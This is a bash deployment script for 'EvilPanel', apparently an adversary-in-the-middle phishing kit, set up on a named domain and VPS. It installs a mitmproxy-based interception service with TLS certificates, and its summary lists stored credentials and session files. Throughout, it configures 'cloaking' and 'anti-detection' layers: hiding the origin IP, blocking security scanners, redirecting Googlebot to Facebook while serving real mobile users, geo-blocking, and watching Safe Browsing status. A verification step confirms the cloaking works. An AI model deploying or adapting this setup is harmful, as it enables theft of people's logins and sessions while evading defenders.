#!/bin/bash
# ============================================================
# EvilPanel VPS Deployment Script
# Domain: frontnews.site
# VPS IP: 206.189.92.6
# ============================================================
#
# Usage (run on VPS as root):
#   chmod +x deploy.sh
#   ./deploy.sh
#
# Prerequisites:
#   - Domain DNS configured in Cloudflare pointing to VPS IP
#   - Cloudflare SSL Mode: Full (Strict)
#   - SSH access to VPS as root
#
# ============================================================

set -e  # Exit on error

# Configuration
DOMAIN="frontnews.site"
INSTALL_DIR="/opt/evilpanel"
DATA_DIR="${INSTALL_DIR}/data"
CERT_DIR="${INSTALL_DIR}/certs"
LOG_DIR="${INSTALL_DIR}/logs"
VENV_DIR="${INSTALL_DIR}/venv"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }

# Header
echo "============================================================"
echo "  EvilPanel VPS Deployment Script"
echo "  Domain: ${DOMAIN}"
echo "============================================================"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   log_error "This script must be run as root"
   exit 1
fi

# ==================== PHASE 1: BASE SETUP ====================
log_info "Phase 1: Installing base dependencies..."

apt update
apt install -y python3 python3-pip python3-venv nginx certbot python3-certbot-nginx sqlite3

log_success "Phase 1 complete: Base dependencies installed"

# ==================== PHASE 2: DIRECTORY STRUCTURE ====================
log_info "Phase 2: Creating directory structure..."

mkdir -p ${INSTALL_DIR}/{core,data,certs,logs,database}
mkdir -p ${DATA_DIR}
mkdir -p ${CERT_DIR}
mkdir -p ${LOG_DIR}

# Set permissions
chmod 755 ${INSTALL_DIR}
chmod 700 ${DATA_DIR}
chmod 700 ${CERT_DIR}
chmod 755 ${LOG_DIR}

log_success "Phase 2 complete: Directory structure created"

# ==================== PHASE 3: SSL CERTIFICATE ====================
log_info "Phase 3: Obtaining SSL certificate..."

# Check if certificate already exists
if [[ -f "/etc/letsencrypt/live/${DOMAIN}/fullchain.pem" ]]; then
    log_warning "Certificate already exists, skipping certbot"
else
    # Stop nginx temporarily for standalone mode
    systemctl stop nginx 2>/dev/null || true
    
    # Get certificate for all subdomains
    certbot certonly --standalone \
        -d ${DOMAIN} \
        -d m.${DOMAIN} \
        -d www.${DOMAIN} \
        --non-interactive \
        --agree-tos \
        --email admin@${DOMAIN} \
        --preferred-challenges http
    
    log_success "SSL certificate obtained"
fi

# Create combined certificate for mitmproxy
log_info "Creating combined certificate for mitmproxy..."
cat /etc/letsencrypt/live/${DOMAIN}/fullchain.pem \
    /etc/letsencrypt/live/${DOMAIN}/privkey.pem \
    > ${CERT_DIR}/combined.pem
chmod 600 ${CERT_DIR}/combined.pem

# Create symlinks for easier access
ln -sf /etc/letsencrypt/live/${DOMAIN}/fullchain.pem ${CERT_DIR}/fullchain.pem
ln -sf /etc/letsencrypt/live/${DOMAIN}/privkey.pem ${CERT_DIR}/privkey.pem

log_success "Phase 3 complete: SSL certificate configured"

# ==================== PHASE 4: PYTHON ENVIRONMENT ====================
log_info "Phase 4: Setting up Python environment..."

# Create virtual environment
python3 -m venv ${VENV_DIR}

# Upgrade pip
${VENV_DIR}/bin/pip install --upgrade pip

# Install mitmproxy and dependencies
${VENV_DIR}/bin/pip install mitmproxy aiohttp requests pyyaml

log_success "Phase 4 complete: Python environment ready"

# ==================== PHASE 5: DATABASE INITIALIZATION ====================
log_info "Phase 5: Initializing database..."

# Create database directory
mkdir -p ${DATA_DIR}

# Check if schema file exists, create if not
SCHEMA_FILE="${INSTALL_DIR}/database/schema.sql"
if [[ -f "${SCHEMA_FILE}" ]]; then
    sqlite3 ${DATA_DIR}/evilpanel.db < ${SCHEMA_FILE}
    log_success "Database initialized from schema.sql"
else
    log_warning "schema.sql not found, database will be created by addon"
fi

# Set database permissions
chmod 600 ${DATA_DIR}/evilpanel.db 2>/dev/null || true

log_success "Phase 5 complete: Database ready"

# ==================== PHASE 6: NGINX CONFIGURATION ====================
log_info "Phase 6: Configuring Nginx..."

# Copy nginx config
if [[ -f "${INSTALL_DIR}/deploy/nginx-frontnews.conf" ]]; then
    cp ${INSTALL_DIR}/deploy/nginx-frontnews.conf /etc/nginx/sites-available/frontnews
else
    log_error "nginx-frontnews.conf not found in deploy directory"
    exit 1
fi

# Enable site
ln -sf /etc/nginx/sites-available/frontnews /etc/nginx/sites-enabled/

# Remove default site
rm -f /etc/nginx/sites-enabled/default

# Test nginx config
nginx -t

# Reload nginx
systemctl reload nginx

log_success "Phase 6 complete: Nginx configured"

# ==================== PHASE 7: SYSTEMD SERVICE ====================
log_info "Phase 7: Installing systemd service..."

# Copy service file
if [[ -f "${INSTALL_DIR}/deploy/evilpanel.service" ]]; then
    cp ${INSTALL_DIR}/deploy/evilpanel.service /etc/systemd/system/
else
    log_error "evilpanel.service not found in deploy directory"
    exit 1
fi

# Reload systemd
systemctl daemon-reload

# Enable service
systemctl enable evilpanel

# Start service
systemctl start evilpanel

# Wait for startup
sleep 3

# Check status
if systemctl is-active --quiet evilpanel; then
    log_success "Phase 7 complete: EvilPanel service running"
else
    log_error "EvilPanel service failed to start"
    journalctl -u evilpanel -n 20 --no-pager
    exit 1
fi

# ==================== PHASE 8: FIREWALL ====================
log_info "Phase 8: Configuring firewall..."

# Allow HTTP, HTTPS
ufw allow 80/tcp 2>/dev/null || true
ufw allow 443/tcp 2>/dev/null || true

# Allow SSH
ufw allow 22/tcp 2>/dev/null || true

log_success "Phase 8 complete: Firewall configured"

# ==================== PHASE 9: ANTI-DETECTION SETUP ====================
log_info "Phase 9: Setting up anti-detection modules..."

# Make deployment scripts executable
chmod +x ${INSTALL_DIR}/deploy/setup-cloudflare.sh 2>/dev/null || true
chmod +x ${INSTALL_DIR}/deploy/update-geoip.sh 2>/dev/null || true

# Install GeoIP2 module (without license key - databases added later)
log_info "Installing GeoIP2 Nginx module..."
apt install -y libnginx-mod-http-geoip2 libmaxminddb0 mmdb-bin 2>/dev/null || log_warning "GeoIP2 module installation skipped"

# Create logs directory for GSB monitoring
mkdir -p ${INSTALL_DIR}/logs

log_success "Phase 9 complete: Anti-detection modules ready"
log_info "  Optional: Run setup-cloudflare.sh to hide origin IP"
log_info "  Optional: Run update-geoip.sh with MaxMind key for geo-blocking"

# ==================== PHASE 10: VERIFICATION ====================
log_info "Phase 10: Running verification tests..."

echo ""
echo "Testing bot blocking (should redirect to Facebook):"
BOT_RESPONSE=$(curl -s -I -A "Googlebot" https://m.${DOMAIN} 2>&1 | head -5)
echo "${BOT_RESPONSE}"

if echo "${BOT_RESPONSE}" | grep -q "301\|302\|facebook.com"; then
    log_success "✓ Bot blocking working"
else
    log_warning "✗ Bot blocking may not be working correctly"
fi

echo ""
echo "Testing real user access (should return 200 OK):"
USER_RESPONSE=$(curl -s -I -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" https://m.${DOMAIN} 2>&1 | head -5)
echo "${USER_RESPONSE}"

if echo "${USER_RESPONSE}" | grep -q "200"; then
    log_success "✓ Real user access working"
else
    log_warning "✗ Real user access may have issues"
fi

# ==================== SUMMARY ====================
echo ""
echo "============================================================"
echo "  Deployment Complete!"
echo "============================================================"
echo ""
echo "Configuration:"
echo "  Domain:        ${DOMAIN}"
echo "  Mobile URL:    https://m.${DOMAIN}"
echo "  Install Dir:   ${INSTALL_DIR}"
echo "  Data Dir:      ${DATA_DIR}"
echo "  Logs Dir:      ${LOG_DIR}"
echo ""
echo "Cloaking Layers:"
echo "  Layer 1: Cloudflare (if enabled) → Origin IP hidden"
echo "  Layer 2: Scanner IP blocks → Known scanner ranges blocked"
echo "  Layer 3: Nginx bot detection → Redirect to Facebook"
echo "  Layer 4: mitmproxy addon → Obfuscated threat levels"
echo ""
echo "Anti-Detection Modules:"
echo "  GSB Monitor:     python3 core/gsb_monitor.py <domain>"
echo "  Domain Manager:  python3 core/domain_manager.py list"
echo ""
echo "Services:"
echo "  Nginx:      systemctl status nginx"
echo "  EvilPanel:  systemctl status evilpanel"
echo ""
echo "Logs:"
echo "  Nginx:      tail -f /var/log/nginx/frontnews.access.log"
echo "  EvilPanel:  journalctl -u evilpanel -f"
echo "  Debug:      tail -f ${DATA_DIR}/debug.log"
echo ""
echo "Data Files:"
echo "  Credentials: ${DATA_DIR}/credentials.json"
echo "  Sessions:    ${DATA_DIR}/sessions.json"
echo "  Database:    ${DATA_DIR}/evilpanel.db"
echo ""
echo "Optional Setup (run after deployment):"
echo "  1. Cloudflare: CF_API_TOKEN=xxx ./deploy/setup-cloudflare.sh"
echo "  2. GeoIP:      MAXMIND_LICENSE_KEY=xxx ./deploy/update-geoip.sh"
echo ""
echo "============================================================"
